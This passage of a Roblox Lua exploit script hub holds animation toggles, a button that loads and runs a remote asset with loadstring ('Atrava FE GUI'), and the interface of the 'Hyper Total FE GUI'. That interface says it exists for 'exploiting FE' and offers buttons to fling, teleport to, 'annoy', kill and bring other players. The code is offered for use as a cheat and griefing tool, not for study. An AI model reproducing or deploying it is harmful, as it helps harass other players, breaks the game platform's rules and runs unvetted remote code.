			end
		end)
		local Anim = Instance.new("Animation")
		Anim.AnimationId = "rbxassetid://708553116"
		local track = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
		WeirdZombieACTIVE = false
		WeirdZombie.MouseButton1Click:connect(function()
			WeirdZombieACTIVE = not WeirdZombieACTIVE
			if WeirdZombieACTIVE then
				WeirdZombie.BackgroundColor3 = rloc
				while wait() do
					if track.IsPlaying == false then
						if WeirdZombieACTIVE then
							track:Play(.1, 1, 1)
						end
					end
				end
			else
				track:Stop()
				WeirdZombie.BackgroundColor3 = rcol
			end
		end)
		local Anim = Instance.new("Animation")
		Anim.AnimationId = "rbxassetid://746398327"
		local track = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
		DownSlashACTIVE = false
		DownSlash.MouseButton1Click:connect(function()
			DownSlashACTIVE = not DownSlashACTIVE
			if DownSlashACTIVE then
				DownSlash.BackgroundColor3 = rloc
				while wait() do
					if track.IsPlaying == false then
						if DownSlashACTIVE then
							track:Play(.1, 1, 1)
						end
					end
				end
			else
				track:Stop()
				DownSlash.BackgroundColor3 = rcol
			end
		end)
		local Anim = Instance.new("Animation")
		Anim.AnimationId = "rbxassetid://675025795"
		local track = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
		PullACTIVE = false
		Pull.MouseButton1Click:connect(function()
			PullACTIVE = not PullACTIVE
			if PullACTIVE then
				Pull.BackgroundColor3 = rloc
				while wait() do
					if track.IsPlaying == false then
						if PullACTIVE then
							track:Play(.1, 1, 1)
						end
					end
				end
			else
				track:Stop()
				Pull.BackgroundColor3 = rcol
			end
		end)
		local Anim = Instance.new("Animation")
		Anim.AnimationId = "rbxassetid://698251653"
		local track = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
		CircleArmACTIVE = false
		CircleArm.MouseButton1Click:connect(function()
			CircleArmACTIVE = not CircleArmACTIVE
			if CircleArmACTIVE then
				CircleArm.BackgroundColor3 = rloc
				while wait() do
					if track.IsPlaying == false then
						if CircleArmACTIVE then
							track:Play(.1, 1, 1)
						end
					end
				end
			else
				track:Stop()
				CircleArm.BackgroundColor3 = rcol
			end
		end)
		local Anim = Instance.new("Animation")
		Anim.AnimationId = "rbxassetid://696096087"
		local track = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
		BendACTIVE = false
		Bend.MouseButton1Click:connect(function()
			BendACTIVE = not BendACTIVE
			if BendACTIVE then
				Bend.BackgroundColor3 = rloc
				while wait() do
					if track.IsPlaying == false then
						if BendACTIVE then
							track:Play(.1, 1, 1)
						end
					end
				end
			else
				track:Stop()
				Bend.BackgroundColor3 = rcol
			end
		end)
		local Anim = Instance.new("Animation")
		Anim.AnimationId = "rbxassetid://675025570"
		local track = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
		RotateSlashACTIVE = false
		RotateSlash.MouseButton1Click:connect(function()
			RotateSlashACTIVE = not RotateSlashACTIVE
			if RotateSlashACTIVE then
				RotateSlash.BackgroundColor3 = rloc
				while wait() do
					if track.IsPlaying == false then
						if RotateSlashACTIVE then
							track:Play(.1, 1, 1)
						end
					end
				end
			else
				track:Stop()
				RotateSlash.BackgroundColor3 = rcol
			end
		end)
		local Anim = Instance.new("Animation")
		Anim.AnimationId = "rbxassetid://754656200"
		local track = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
		FlingArmsACTIVE = false
		FlingArms.MouseButton1Click:connect(function()
			FlingArmsACTIVE = not FlingArmsACTIVE
			if FlingArmsACTIVE then
				FlingArms.BackgroundColor3 = rloc
				while wait() do
					if track.IsPlaying == false then
						if FlingArmsACTIVE then
							track:Play(.1, 1, 10)
						end
					end
				end
			else
				track:Stop()
				FlingArms.BackgroundColor3 = rcol
			end
		end)

-- Finished update!
	end
})
GUIS:AddButton({
	Title = "Atrava FE GUI",
	Description = "Atrava FE GUI",
	Callback = function()
		loadstring(game:GetObjects("rbxassetid://1468845733")[1].Source)()
	end
})
GUIS:AddButton({
	Title = "Hyper Total FE GUI",
	Description = "Hyper Total FE GUI",
	Callback = function()
			-- Credit to Timeless/xFunnieuss for the partial names/short names

-- Objects
		local HyperTotal = Instance.new("ScreenGui")
		local MainFrame = Instance.new("Frame")
		local TopFrame = Instance.new("Frame")
		local Title = Instance.new("TextLabel")
		local EnterUsername = Instance.new("TextBox")
		local CloseGUI = Instance.new("TextButton")
		local CreditTXT = Instance.new("TextLabel")
		local Sections = Instance.new("Frame")
		local INTRO = Instance.new("Frame")
		local FE_CHECK = Instance.new("TextLabel")
		local Guide1 = Instance.new("TextLabel")
		local Guide2 = Instance.new("TextLabel")
		local Credit = Instance.new("TextLabel")
		local RocketPropulsion = Instance.new("Frame")
		local ROCKETPROPULSIONGUIDE = Instance.new("TextLabel")
		local Push = Instance.new("TextButton")
		local Flatten = Instance.new("TextButton")
		local Float = Instance.new("TextButton")
		local Max = Instance.new("TextButton")
		local AimHead = Instance.new("TextButton")
		local SlowAttract = Instance.new("TextButton")
		local Experimental = Instance.new("TextButton")
		local Multiple = Instance.new("TextButton")
		local Teleportation = Instance.new("Frame")
		local TELEPORTATIONGUIDE = Instance.new("TextLabel")
		local TeleportTo = Instance.new("TextButton")
		local LockOn = Instance.new("TextButton")
		local LockArm = Instance.new("TextButton")
		local LockLeg = Instance.new("TextButton")
		local LockHead = Instance.new("TextButton")
		local LockMax = Instance.new("TextButton")
		local LockAbove = Instance.new("TextButton")
		local Trail = Instance.new("TextButton")
		local Tools = Instance.new("Frame")
		local TOOLSGUIDE = Instance.new("TextLabel")
		local Kill = Instance.new("TextButton")
		local KillSurvive = Instance.new("TextButton")
		local Attach = Instance.new("TextButton")
		local Bring = Instance.new("TextButton")
		local SuperSpin = Instance.new("TextButton")
		local FreeFall = Instance.new("TextButton")
		local AttachExperimental = Instance.new("TextButton")
		local GiveTool = Instance.new("TextButton")
		local Basic = Instance.new("Frame")
		local BASICGUIDE = Instance.new("TextLabel")
		local Speed = Instance.new("TextButton")
		local JumpHeight = Instance.new("TextButton")
		local Chat = Instance.new("TextButton")
		local Spam = Instance.new("TextButton")
		local Fly = Instance.new("TextButton")
		local Noclip = Instance.new("TextButton")
		local HipHeight = Instance.new("TextButton")
		local STATCHANGE = Instance.new("TextBox")
		local CHATBOX = Instance.new("TextBox")
		local Local_Player = Instance.new("Frame")
		local Local_PlayerGUIDE = Instance.new("TextLabel")
		local CrazySpin = Instance.new("TextButton")
		local CrouchRocket = Instance.new("TextButton")
		local Haunted = Instance.new("TextButton")
		local CloneIllusion = Instance.new("TextButton")
		local Levitate = Instance.new("TextButton")
		local Dinosaur = Instance.new("TextButton")
		local Glitchy = Instance.new("TextButton")
		local NoLimbs = Instance.new("TextButton")
		local Animations = Instance.new("Frame")
		local ANIMATIONSGUIDE = Instance.new("TextLabel")
		local _18 = Instance.new("TextButton")
		local Hide = Instance.new("TextButton")
		local PushLock = Instance.new("TextButton")
		local SlamOn = Instance.new("TextButton")
		local LevitateOn = Instance.new("TextButton")
		local Dance = Instance.new("TextButton")
		local ExperimentalAnimation = Instance.new("TextButton")
		local Carpet = Instance.new("TextButton")
		local Extra = Instance.new("Frame")
		local EXTRAGUIDE = Instance.new("TextLabel")
		local Sit = Instance.new("TextButton")
		local Jump = Instance.new("TextButton")
		local PlatformStand = Instance.new("TextButton")
		local Freeze = Instance.new("TextButton")
		local Insane = Instance.new("TextButton")
		local TPVoid = Instance.new("TextButton")
		local Unknown = Instance.new("TextButton")
		local Reset = Instance.new("TextButton")
		local SelectTabs = Instance.new("ScrollingFrame")
		local RocketPropulsionTAB = Instance.new("TextButton")
		local TeleportationTAB = Instance.new("TextButton")
		local ToolsTAB = Instance.new("TextButton")
		local AnimationsTAB = Instance.new("TextButton")
		local BasicTAB = Instance.new("TextButton")
		local Local_PlayerTAB = Instance.new("TextButton")
		local ExtraTAB = Instance.new("TextButton")
		local SideTopFrame = Instance.new("Frame")
		local SideTitle = Instance.new("TextLabel")
		local OpenGUI = Instance.new("TextButton")
		local SideCreditTXT = Instance.new("TextLabel")
		local SideFrame = Instance.new("Frame")
		local BrickFrame = Instance.new("Frame")

-- Properties
		HyperTotal.Name = "HyperTotal"
		HyperTotal.Parent = game.CoreGui
		MainFrame.Name = "MainFrame"
		MainFrame.Parent = HyperTotal
		MainFrame.Active = true
		MainFrame.BackgroundColor3 = Color3.new(1, 1, 1)
		MainFrame.BackgroundTransparency = 1
		MainFrame.Draggable = true
		MainFrame.Position = UDim2.new(0.348623842, 0, 1, 0)
		MainFrame.Size = UDim2.new(0, 350, 0, 270)
		TopFrame.Name = "TopFrame"
		TopFrame.Parent = MainFrame
		TopFrame.BackgroundColor3 = Color3.new(0.121569, 0.121569, 0.121569)
		TopFrame.BorderColor3 = Color3.new(0.121569, 0.121569, 0.121569)
		TopFrame.BorderSizePixel = 2
		TopFrame.Position = UDim2.new(-0.286500663, 0, 0, 0)
		TopFrame.Size = UDim2.new(0, 450, 0, 40)
		TopFrame.ZIndex = 9
		Title.Name = "Title"
		Title.Parent = TopFrame
		Title.BackgroundColor3 = Color3.new(1, 1, 1)
		Title.BackgroundTransparency = 1
		Title.Position = UDim2.new(0.356534153, 0, 0, 0)
		Title.Size = UDim2.new(0, 150, 0, 40)
		Title.ZIndex = 10
		Title.Font = Enum.Font.SourceSansItalic
		Title.FontSize = Enum.FontSize.Size36
		Title.Text = "HyperTotal"
		Title.TextColor3 = Color3.new(0.933333, 0.670588, 0.0509804)
		Title.TextSize = 35
		Title.TextWrapped = true
		EnterUsername.Name = "EnterUsername"
		EnterUsername.Parent = TopFrame
		EnterUsername.BackgroundColor3 = Color3.new(1, 1, 1)
		EnterUsername.BorderColor3 = Color3.new(0.968628, 0.698039, 0.0588235)
		EnterUsername.BorderSizePixel = 2
		EnterUsername.Position = UDim2.new(0.0199999996, 0, 0.200000003, 0)
		EnterUsername.Size = UDim2.new(0, 120, 0, 24)
		EnterUsername.ZIndex = 10
		EnterUsername.Font = Enum.Font.SourceSans
		EnterUsername.FontSize = Enum.FontSize.Size14
		EnterUsername.Text = ""
		EnterUsername.TextScaled = true
		EnterUsername.TextSize = 14
		EnterUsername.TextWrapped = true
		CloseGUI.Name = "CloseGUI"
		CloseGUI.Parent = TopFrame
		CloseGUI.BackgroundColor3 = Color3.new(1, 1, 1)
		CloseGUI.BackgroundTransparency = 1
		CloseGUI.Position = UDim2.new(0.913618803, 0, 0, 0)
		CloseGUI.Size = UDim2.new(0, 40, 0, 40)
		CloseGUI.ZIndex = 10
		CloseGUI.Font = Enum.Font.SourceSansBold
		CloseGUI.FontSize = Enum.FontSize.Size60
		CloseGUI.Text = "X"
		CloseGUI.TextColor3 = Color3.new(1, 0.631373, 0.109804)
		CloseGUI.TextSize = 50
		CloseGUI.TextWrapped = true
		CreditTXT.Name = "CreditTXT"
		CreditTXT.Parent = TopFrame
		CreditTXT.BackgroundColor3 = Color3.new(1, 1, 1)
		CreditTXT.BackgroundTransparency = 1
		CreditTXT.Position = UDim2.new(0.690784931, 0, 0.250416666, 0)
		CreditTXT.Rotation = -17
		CreditTXT.Size = UDim2.new(0, 90, 0, 20)
		CreditTXT.ZIndex = 10
		CreditTXT.Font = Enum.Font.SourceSansItalic
		CreditTXT.FontSize = Enum.FontSize.Size24
		CreditTXT.Text = "illremember"
		CreditTXT.TextColor3 = Color3.new(0.933333, 0.819608, 0.737255)
		CreditTXT.TextSize = 20
		CreditTXT.TextWrapped = true
		Sections.Name = "Sections"
		Sections.Parent = MainFrame
		Sections.BackgroundColor3 = Color3.new(0.278431, 0.278431, 0.278431)
		Sections.BackgroundTransparency = 1
		Sections.BorderColor3 = Color3.new(0.121569, 0.121569, 0.121569)
		Sections.BorderSizePixel = 2
		Sections.Position = UDim2.new(0, 0, 0.148395061, 0)
		Sections.Size = UDim2.new(0, 350, 0, 230)
		INTRO.Name = "INTRO"
		INTRO.Parent = Sections
		INTRO.BackgroundColor3 = Color3.new(0.278431, 0.278431, 0.278431)
		INTRO.BorderColor3 = Color3.new(0.121569, 0.121569, 0.121569)
		INTRO.BorderSizePixel = 2
		INTRO.Size = UDim2.new(0, 350, 0, 230)
		FE_CHECK.Name = "FE_CHECK"
		FE_CHECK.Parent = INTRO
		FE_CHECK.BackgroundColor3 = Color3.new(1, 1, 1)
		FE_CHECK.BackgroundTransparency = 1
		FE_CHECK.Position = UDim2.new(0.0286500659, 0, 0.0435507223, 0)
		FE_CHECK.Size = UDim2.new(0, 332, 0, 50)
		FE_CHECK.Font = Enum.Font.ArialBold
		FE_CHECK.FontSize = Enum.FontSize.Size14
		FE_CHECK.Text = "Error loading FE Checker"
		FE_CHECK.TextScaled = true
		FE_CHECK.TextSize = 14
		FE_CHECK.TextWrapped = true
		Guide1.Name = "Guide1"
		Guide1.Parent = INTRO
		Guide1.BackgroundColor3 = Color3.new(1, 1, 1)
		Guide1.BackgroundTransparency = 1
		Guide1.Position = UDim2.new(0.0286500659, 0, 0.653260887, 0)
		Guide1.Size = UDim2.new(0, 332, 0, 80)
		Guide1.Font = Enum.Font.ArialBold
		Guide1.FontSize = Enum.FontSize.Size14
		Guide1.Text = "Click on one of the sections to the left to begin exploiting FE Sections! Enter a name in the textbox (top left) to affect that player. You don't have to write their full username."
		Guide1.TextScaled = true
		Guide1.TextSize = 14
		Guide1.TextStrokeColor3 = Color3.new(0.831373, 0.831373, 0.831373)
		Guide1.TextStrokeTransparency = 0.5
		Guide1.TextWrapped = true
		Guide2.Name = "Guide2"
		Guide2.Parent = INTRO
		Guide2.BackgroundColor3 = Color3.new(1, 1, 1)
		Guide2.BackgroundTransparency = 1
		Guide2.Position = UDim2.new(0.0286500659, 0, 0.217753619, 0)
		Guide2.Size = UDim2.new(0, 332, 0, 50)
		Guide2.Font = Enum.Font.ArialBold
		Guide2.FontSize = Enum.FontSize.Size14
		Guide2.Text = "This GUI is dedicated to exploiting FE Sections, affecting yourself and others"
		Guide2.TextScaled = true
		Guide2.TextSize = 14
		Guide2.TextStrokeColor3 = Color3.new(1, 0.658824, 0.0666667)
		Guide2.TextStrokeTransparency = 0
		Guide2.TextWrapped = true
		Credit.Name = "Credit"
		Credit.Parent = INTRO
		Credit.BackgroundColor3 = Color3.new(1, 1, 1)
		Credit.BackgroundTransparency = 1
		Credit.Position = UDim2.new(0.0286500659, 0, 0.435507238, 0)
		Credit.Size = UDim2.new(0, 332, 0, 50)
		Credit.Font = Enum.Font.ArialBold
		Credit.FontSize = Enum.FontSize.Size14
		Credit.Text = "By illremember"
		Credit.TextColor3 = Color3.new(0.92549, 0.607843, 0.0901961)
		Credit.TextScaled = true
		Credit.TextSize = 14
		Credit.TextStrokeColor3 = Color3.new(1, 0.658824, 0.0666667)
		Credit.TextWrapped = true
		RocketPropulsion.Name = "RocketPropulsion"
		RocketPropulsion.Parent = Sections
		RocketPropulsion.BackgroundColor3 = Color3.new(0.278431, 0.278431, 0.278431)
		RocketPropulsion.BorderColor3 = Color3.new(0.121569, 0.121569, 0.121569)
		RocketPropulsion.BorderSizePixel = 2
		RocketPropulsion.Size = UDim2.new(0, 350, 0, 230)
		RocketPropulsion.Visible = false
		ROCKETPROPULSIONGUIDE.Name = "ROCKETPROPULSIONGUIDE"
		ROCKETPROPULSIONGUIDE.Parent = RocketPropulsion
		ROCKETPROPULSIONGUIDE.BackgroundColor3 = Color3.new(1, 1, 1)
		ROCKETPROPULSIONGUIDE.BackgroundTransparency = 1
		ROCKETPROPULSIONGUIDE.Position = UDim2.new(0.0286500659, 0, 0.0435507223, 0)
		ROCKETPROPULSIONGUIDE.Size = UDim2.new(0, 332, 0, 35)
		ROCKETPROPULSIONGUIDE.Font = Enum.Font.ArialBold
		ROCKETPROPULSIONGUIDE.FontSize = Enum.FontSize.Size14
		ROCKETPROPULSIONGUIDE.Text = "Fling and push others, works best in a group of people."
		ROCKETPROPULSIONGUIDE.TextScaled = true
		ROCKETPROPULSIONGUIDE.TextSize = 14
		ROCKETPROPULSIONGUIDE.TextStrokeColor3 = Color3.new(1, 0.658824, 0.0666667)
		ROCKETPROPULSIONGUIDE.TextStrokeTransparency = 0
		ROCKETPROPULSIONGUIDE.TextWrapped = true
		Push.Name = "Push"
		Push.Parent = RocketPropulsion
		Push.BackgroundColor3 = Color3.new(0.854902, 0.854902, 0.854902)
		Push.BorderColor3 = Color3.new(0.941177, 0.701961, 0.133333)
		Push.Position = UDim2.new(0.0286500659, 0, 0.261304349, 0)
		Push.Size = UDim2.new(0, 140, 0, 25)
		Push.Font = Enum.Font.SourceSans
		Push.FontSize = Enum.FontSize.Size14
		Push.Text = "Push"
		Push.TextScaled = true
		Push.TextSize = 14
		Push.TextWrapped = true
		Flatten.Name = "Flatten"
		Flatten.Parent = RocketPropulsion
		Flatten.BackgroundColor3 = Color3.new(0.854902, 0.854902, 0.854902)
		Flatten.BorderColor3 = Color3.new(0.941177, 0.701961, 0.133333)
		Flatten.Position = UDim2.new(0.54435122, 0, 0.261304349, 0)
		Flatten.Size = UDim2.new(0, 140, 0, 25)
		Flatten.Font = Enum.Font.SourceSans
		Flatten.FontSize = Enum.FontSize.Size14
		Flatten.Text = "Flatten"
		Flatten.TextScaled = true
		Flatten.TextSize = 14
		Flatten.TextWrapped = true
		Float.Name = "Float"
		Float.Parent = RocketPropulsion
		Float.BackgroundColor3 = Color3.new(0.854902, 0.854902, 0.854902)
		Float.BorderColor3 = Color3.new(0.941177, 0.701961, 0.133333)
		Float.Position = UDim2.new(0.54435122, 0, 0.435507238, 0)
		Float.Size = UDim2.new(0, 140, 0, 25)
		Float.Font = Enum.Font.SourceSans
		Float.FontSize = Enum.FontSize.Size14
		Float.Text = "Float"
		Float.TextScaled = true
		Float.TextSize = 14
		Float.TextWrapped = true
		Max.Name = "Max"
		Max.Parent = RocketPropulsion
		Max.BackgroundColor3 = Color3.new(0.854902, 0.854902, 0.854902)
		Max.BorderColor3 = Color3.new(0.941177, 0.701961, 0.133333)
		Max.Position = UDim2.new(0.0286500659, 0, 0.435507238, 0)
		Max.Size = UDim2.new(0, 140, 0, 25)
		Max.Font = Enum.Font.SourceSans
		Max.FontSize = Enum.FontSize.Size14
		Max.Text = "Max"
		Max.TextScaled = true
		Max.TextSize = 14
		Max.TextWrapped = true
		AimHead.Name = "AimHead"
		AimHead.Parent = RocketPropulsion
		AimHead.BackgroundColor3 = Color3.new(0.854902, 0.854902, 0.854902)
		AimHead.BorderColor3 = Color3.new(0.941177, 0.701961, 0.133333)
		AimHead.Position = UDim2.new(0.0286500659, 0, 0.609710157, 0)
		AimHead.Size = UDim2.new(0, 140, 0, 25)
		AimHead.Font = Enum.Font.SourceSans
		AimHead.FontSize = Enum.FontSize.Size14
		AimHead.Text = "AimHead"
		AimHead.TextScaled = true
		AimHead.TextSize = 14
		AimHead.TextWrapped = true
		SlowAttract.Name = "SlowAttract"
		SlowAttract.Parent = RocketPropulsion
		SlowAttract.BackgroundColor3 = Color3.new(0.854902, 0.854902, 0.854902)
		SlowAttract.BorderColor3 = Color3.new(0.941177, 0.701961, 0.133333)
		SlowAttract.Position = UDim2.new(0.54435122, 0, 0.609710157, 0)
		SlowAttract.Size = UDim2.new(0, 140, 0, 25)
		SlowAttract.Font = Enum.Font.SourceSans
		SlowAttract.FontSize = Enum.FontSize.Size14
		SlowAttract.Text = "SlowAttract"
		SlowAttract.TextScaled = true
		SlowAttract.TextSize = 14
		SlowAttract.TextWrapped = true
		Experimental.Name = "Experimental"
		Experimental.Parent = RocketPropulsion
		Experimental.BackgroundColor3 = Color3.new(0.854902, 0.854902, 0.854902)
		Experimental.BorderColor3 = Color3.new(0.941177, 0.701961, 0.133333)
		Experimental.Position = UDim2.new(0.54435122, 0, 0.783913076, 0)
		Experimental.Size = UDim2.new(0, 140, 0, 25)
		Experimental.Font = Enum.Font.SourceSans
		Experimental.FontSize = Enum.FontSize.Size14
		Experimental.Text = "Experimental"
		Experimental.TextScaled = true
		Experimental.TextSize = 14
		Experimental.TextWrapped = true
		Multiple.Name = "Multiple"
		Multiple.Parent = RocketPropulsion
		Multiple.BackgroundColor3 = Color3.new(0.854902, 0.854902, 0.854902)
		Multiple.BorderColor3 = Color3.new(0.941177, 0.701961, 0.133333)
		Multiple.Position = UDim2.new(0.0286500659, 0, 0.783913076, 0)
		Multiple.Size = UDim2.new(0, 140, 0, 25)
		Multiple.Font = Enum.Font.SourceSans
		Multiple.FontSize = Enum.FontSize.Size14
		Multiple.Text = "Multiple"
		Multiple.TextScaled = true
		Multiple.TextSize = 14
		Multiple.TextWrapped = true
		Teleportation.Name = "Teleportation"
		Teleportation.Parent = Sections
		Teleportation.BackgroundColor3 = Color3.new(0.278431, 0.278431, 0.278431)
		Teleportation.BorderColor3 = Color3.new(0.121569, 0.121569, 0.121569)
		Teleportation.BorderSizePixel = 2
		Teleportation.Size = UDim2.new(0, 350, 0, 230)
		Teleportation.Visible = false
		TELEPORTATIONGUIDE.Name = "TELEPORTATIONGUIDE"
		TELEPORTATIONGUIDE.Parent = Teleportation
		TELEPORTATIONGUIDE.BackgroundColor3 = Color3.new(1, 1, 1)
		TELEPORTATIONGUIDE.BackgroundTransparency = 1
		TELEPORTATIONGUIDE.Position = UDim2.new(0.0286500659, 0, 0.0435507223, 0)
		TELEPORTATIONGUIDE.Size = UDim2.new(0, 332, 0, 35)
		TELEPORTATIONGUIDE.Font = Enum.Font.ArialBold
		TELEPORTATIONGUIDE.FontSize = Enum.FontSize.Size14
		TELEPORTATIONGUIDE.Text = "Teleport to and annoy other players."
		TELEPORTATIONGUIDE.TextScaled = true
		TELEPORTATIONGUIDE.TextSize = 14
		TELEPORTATIONGUIDE.TextStrokeColor3 = Color3.new(1, 0.658824, 0.0666667)
		TELEPORTATIONGUIDE.TextStrokeTransparency = 0
		TELEPORTATIONGUIDE.TextWrapped = true
		TeleportTo.Name = "TeleportTo"
		TeleportTo.Parent = Teleportation
		TeleportTo.BackgroundColor3 = Color3.new(0.854902, 0.854902, 0.854902)
		TeleportTo.BorderColor3 = Color3.new(0.941177, 0.701961, 0.133333)
		TeleportTo.Position = UDim2.new(0.0286500659, 0, 0.261304349, 0)
		TeleportTo.Size = UDim2.new(0, 140, 0, 25)
		TeleportTo.Font = Enum.Font.SourceSans
		TeleportTo.FontSize = Enum.FontSize.Size14
		TeleportTo.Text = "Teleport To"
		TeleportTo.TextScaled = true
		TeleportTo.TextSize = 14
		TeleportTo.TextWrapped = true
		LockOn.Name = "LockOn"
		LockOn.Parent = Teleportation
		LockOn.BackgroundColor3 = Color3.new(0.854902, 0.854902, 0.854902)
		LockOn.BorderColor3 = Color3.new(0.941177, 0.701961, 0.133333)
		LockOn.Position = UDim2.new(0.54435122, 0, 0.261304349, 0)
		LockOn.Size = UDim2.new(0, 140, 0, 25)
		LockOn.Font = Enum.Font.SourceSans
		LockOn.FontSize = Enum.FontSize.Size14
		LockOn.Text = "Lock On"
		LockOn.TextScaled = true
		LockOn.TextSize = 14
		LockOn.TextWrapped = true
		LockArm.Name = "LockArm"
		LockArm.Parent = Teleportation
		LockArm.BackgroundColor3 = Color3.new(0.854902, 0.854902, 0.854902)
		LockArm.BorderColor3 = Color3.new(0.941177, 0.701961, 0.133333)
		LockArm.Position = UDim2.new(0.54435122, 0, 0.435507238, 0)
		LockArm.Size = UDim2.new(0, 140, 0, 25)
		LockArm.Font = Enum.Font.SourceSans
		LockArm.FontSize = Enum.FontSize.Size14
		LockArm.Text = "Lock Arm"
		LockArm.TextScaled = true
		LockArm.TextSize = 14
		LockArm.TextWrapped = true
		LockLeg.Name = "LockLeg"
		LockLeg.Parent = Teleportation
		LockLeg.BackgroundColor3 = Color3.new(0.854902, 0.854902, 0.854902)
		LockLeg.BorderColor3 = Color3.new(0.941177, 0.701961, 0.133333)
		LockLeg.Position = UDim2.new(0.0286500659, 0, 0.435507238, 0)
		LockLeg.Size = UDim2.new(0, 140, 0, 25)
		LockLeg.Font = Enum.Font.SourceSans
		LockLeg.FontSize = Enum.FontSize.Size14
		LockLeg.Text = "Lock Leg"
		LockLeg.TextScaled = true
		LockLeg.TextSize = 14
		LockLeg.TextWrapped = true
		LockHead.Name = "LockHead"
		LockHead.Parent = Teleportation
		LockHead.BackgroundColor3 = Color3.new(0.854902, 0.854902, 0.854902)
		LockHead.BorderColor3 = Color3.new(0.941177, 0.701961, 0.133333)
		LockHead.Position = UDim2.new(0.0286500659, 0, 0.609710157, 0)
		LockHead.Size = UDim2.new(0, 140, 0, 25)
		LockHead.Font = Enum.Font.SourceSans
		LockHead.FontSize = Enum.FontSize.Size14
		LockHead.Text = "LockHead"
		LockHead.TextScaled = true
		LockHead.TextSize = 14
		LockHead.TextWrapped = true
		LockMax.Name = "LockMax"
		LockMax.Parent = Teleportation
		LockMax.BackgroundColor3 = Color3.new(0.854902, 0.854902, 0.854902)
		LockMax.BorderColor3 = Color3.new(0.941177, 0.701961, 0.133333)
		LockMax.Position = UDim2.new(0.54435122, 0, 0.609710157, 0)
		LockMax.Size = UDim2.new(0, 140, 0, 25)
		LockMax.Font = Enum.Font.SourceSans
		LockMax.FontSize = Enum.FontSize.Size14
		LockMax.Text = "Lock Max"
		LockMax.TextScaled = true
		LockMax.TextSize = 14
		LockMax.TextWrapped = true
		LockAbove.Name = "LockAbove"
		LockAbove.Parent = Teleportation
		LockAbove.BackgroundColor3 = Color3.new(0.854902, 0.854902, 0.854902)
		LockAbove.BorderColor3 = Color3.new(0.941177, 0.701961, 0.133333)
		LockAbove.Position = UDim2.new(0.54435122, 0, 0.783913076, 0)
		LockAbove.Size = UDim2.new(0, 140, 0, 25)
		LockAbove.Font = Enum.Font.SourceSans
		LockAbove.FontSize = Enum.FontSize.Size14
		LockAbove.Text = "Lock Above"
		LockAbove.TextScaled = true
		LockAbove.TextSize = 14
		LockAbove.TextWrapped = true
		Trail.Name = "Trail"
		Trail.Parent = Teleportation
		Trail.BackgroundColor3 = Color3.new(0.854902, 0.854902, 0.854902)
		Trail.BorderColor3 = Color3.new(0.941177, 0.701961, 0.133333)
		Trail.Position = UDim2.new(0.0286500659, 0, 0.783913076, 0)
		Trail.Size = UDim2.new(0, 140, 0, 25)
		Trail.Font = Enum.Font.SourceSans
		Trail.FontSize = Enum.FontSize.Size14
		Trail.Text = "Trail"
		Trail.TextScaled = true
		Trail.TextSize = 14
		Trail.TextWrapped = true
		Tools.Name = "Tools"
		Tools.Parent = Sections
		Tools.BackgroundColor3 = Color3.new(0.278431, 0.278431, 0.278431)
		Tools.BorderColor3 = Color3.new(0.121569, 0.121569, 0.121569)
		Tools.BorderSizePixel = 2
		Tools.Size = UDim2.new(0, 350, 0, 230)
		Tools.Visible = false
		TOOLSGUIDE.Name = "TOOLSGUIDE"
		TOOLSGUIDE.Parent = Tools
		TOOLSGUIDE.BackgroundColor3 = Color3.new(1, 1, 1)
		TOOLSGUIDE.BackgroundTransparency = 1
		TOOLSGUIDE.Position = UDim2.new(0.0286500659, 0, 0.0435507223, 0)
		TOOLSGUIDE.Size = UDim2.new(0, 332, 0, 35)
		TOOLSGUIDE.Font = Enum.Font.ArialBold
		TOOLSGUIDE.FontSize = Enum.FontSize.Size14
		TOOLSGUIDE.Text = "Do cool commands on others, as long as you have tools in your inventory."
		TOOLSGUIDE.TextScaled = true
		TOOLSGUIDE.TextSize = 14
		TOOLSGUIDE.TextStrokeColor3 = Color3.new(1, 0.658824, 0.0666667)
		TOOLSGUIDE.TextStrokeTransparency = 0
		TOOLSGUIDE.TextWrapped = true
		Kill.Name = "Kill"
		Kill.Parent = Tools
		Kill.BackgroundColor3 = Color3.new(0.854902, 0.854902, 0.854902)
		Kill.BorderColor3 = Color3.new(0.941177, 0.701961, 0.133333)
		Kill.Position = UDim2.new(0.0286500659, 0, 0.261304349, 0)
		Kill.Size = UDim2.new(0, 140, 0, 25)
		Kill.Font = Enum.Font.SourceSans
		Kill.FontSize = Enum.FontSize.Size14
		Kill.Text = "Kill"
		Kill.TextScaled = true
		Kill.TextSize = 14
		Kill.TextWrapped = true
		KillSurvive.Name = "KillSurvive"
		KillSurvive.Parent = Tools
		KillSurvive.BackgroundColor3 = Color3.new(0.854902, 0.854902, 0.854902)
		KillSurvive.BorderColor3 = Color3.new(0.941177, 0.701961, 0.133333)
		KillSurvive.Position = UDim2.new(0.54435122, 0, 0.261304349, 0)
		KillSurvive.Size = UDim2.new(0, 140, 0, 25)
		KillSurvive.Font = Enum.Font.SourceSans
		KillSurvive.FontSize = Enum.FontSize.Size14
		KillSurvive.Text = "Kill Survive"
		KillSurvive.TextScaled = true
		KillSurvive.TextSize = 14
		KillSurvive.TextWrapped = true
		Attach.Name = "Attach"
		Attach.Parent = Tools
		Attach.BackgroundColor3 = Color3.new(0.854902, 0.854902, 0.854902)
		Attach.BorderColor3 = Color3.new(0.941177, 0.701961, 0.133333)
		Attach.Position = UDim2.new(0.54435122, 0, 0.435507238, 0)
		Attach.Size = UDim2.new(0, 140, 0, 25)
		Attach.Font = Enum.Font.SourceSans
		Attach.FontSize = Enum.FontSize.Size14
		Attach.Text = "Attach"
		Attach.TextScaled = true
		Attach.TextSize = 14
		Attach.TextWrapped = true
		Bring.Name = "Bring"
		Bring.Parent = Tools
		Bring.BackgroundColor3 = Color3.new(0.854902, 0.854902, 0.854902)
		Bring.BorderColor3 = Color3.new(0.941177, 0.701961, 0.133333)
		Bring.Position = UDim2.new(0.0286500659, 0, 0.435507238, 0)
		Bring.Size = UDim2.new(0, 140, 0, 25)
		Bring.Font = Enum.Font.SourceSans
		Bring.FontSize = Enum.FontSize.Size14
		Bring.Text = "Bring"
		Bring.TextScaled = true
		Bring.TextSize = 14
		Bring.TextWrapped = true
